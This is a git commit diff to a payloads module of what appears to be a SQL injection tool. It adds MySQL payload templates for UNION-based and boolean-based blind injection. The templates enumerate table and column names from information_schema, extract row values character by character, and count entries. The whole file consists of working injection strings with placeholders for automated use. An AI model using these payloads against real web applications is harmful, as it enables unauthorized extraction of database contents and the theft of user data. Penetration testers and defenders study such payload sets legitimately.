c740173835dd8d5ea1da0ee3cc2637776461b8fe
user0o1 <alucauser@gmail.com>
2025-03-03 23:53:12 +0000

    added some payloads

--- core/payloads.py
+++ core/payloads.py
@@ -6,27 +6,45 @@ payloads
 
 """
 
-
-table_name_payloads = {
+table_name_payloads_union_based = {
     "MySQL": [
-		"'OR IF((SELECT MID(table_name,{position},1) FROM information_schema.tables WHERE table_schema=database() LIMIT {offset},1){operator}'{char}',1,0)-- "
+        "'UNION SELECT (table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT {offset},1 -- "
     ]
 }
 
-column_name_payloads = {
+column_name_payloads_union_based = {
     "MySQL": [
-        "'OR IF((SELECT MID(column_name,{position},1) FROM information_schema.columns WHERE table_name='{table}' LIMIT {offset},1){operator}'{char}',1,0)-- "
+        "'UNION SELECT (column_name) FROM information_schema.columns WHERE table_name='{table}' LIMIT {offset},1 -- "
+    ]
+
+}
+
+entity_name_payloads_union_based = {
+    "MySQL": [
+        "'UNION SELECT ({column}) FROM {table} LIMIT {offset},1-- "
     ]
 }
 
-entity_name_payloads = {
+table_name_payloads_boolen_based_blind = {
     "MySQL": [
-        "'OR IF((SELECT MID({column},{position},1) FROM {table} LIMIT {offset},1){operator}'{char}',1,0)-- "
+		"'OR IF((SELECT MID(table_name,{position},1) FROM information_schema.tables WHERE table_schema=database() LIMIT {offset},1){operator}'{char}',1,0) -- "
     ]
 }
 
-entity_count_payloads = {
+column_name_payloads_boolen_based_blind = {
     "MySQL": [
-        "'OR IF((SELECT COUNT({column}) FROM {table}){operator}{num},1,0)-- "
+        "'OR IF((SELECT MID(column_name,{position},1) FROM information_schema.columns WHERE table_name='{table}' LIMIT {offset},1){operator}'{char}',1,0) -- "
+    ]
+}
+
+entity_name_payloads_boolen_based_blind = {
+    "MySQL": [
+        "'OR IF((SELECT MID({column},{position},1) FROM {table} LIMIT {offset},1){operator}'{char}',1,0) -- "
+    ]
+}
+
+entity_count_payloads_boolen_based_blind = {
+    "MySQL": [
+        "'OR IF((SELECT COUNT({column}) FROM {table}){operator}{num},1,0) -- "
     ]
 }
